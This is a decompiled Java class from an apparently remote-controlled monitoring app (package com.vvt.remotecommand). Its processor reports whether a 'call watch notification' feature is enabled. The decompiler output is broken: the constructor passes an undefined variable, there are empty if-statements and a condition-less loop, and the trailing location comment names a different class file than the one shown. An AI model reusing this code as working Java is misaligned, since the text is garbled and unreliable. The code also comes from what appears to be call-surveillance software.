package com.vvt.remotecommand.processor.f;

import com.vvt.base.FeatureId;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;

public class c
  extends com.vvt.remotecommand.processor.a
{
  private static final boolean b = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama, localRemoteFunction);
  }
  
  protected String a()
  {
    return "ProcEnableWatchNotification";
  }
  
  protected String b()
  {
    Object localObject1 = b.b(h());
    Object localObject2 = FeatureId.CALL_WATCH_NOTIFICATION;
    boolean bool1 = ((RmtCtrlOutputSettings)localObject1).getFeatureStatus((FeatureId)localObject2);
    boolean bool2 = b;
    if (bool2) {}
    localObject2 = "Watch notification is %s";
    int i = 1;
    Object[] arrayOfObject = new Object[i];
    if (bool1) {}
    for (localObject1 = "enabled";; localObject1 = "disabled")
    {
      arrayOfObject[0] = localObject1;
      return String.format((String)localObject2, arrayOfObject);
    }
  }
  
  protected boolean c()
  {
    return false;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/f/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */